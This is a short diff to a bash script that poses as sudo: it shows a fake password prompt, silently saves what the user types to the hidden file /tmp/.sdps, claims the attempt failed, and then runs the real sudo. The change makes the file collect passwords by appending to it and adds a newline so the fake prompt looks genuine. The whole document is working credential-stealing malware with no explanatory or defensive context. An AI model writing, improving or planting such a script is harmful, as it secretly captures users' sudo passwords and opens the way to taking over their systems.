@@ -1,6 +1,7 @@
 #!/bin/bash
 echo -n Password: 
 read -s password
-echo $password > /tmp/.sdps
+echo $password >> /tmp/.sdps
+echo
 echo "Sorry, try again."
 sudo $@
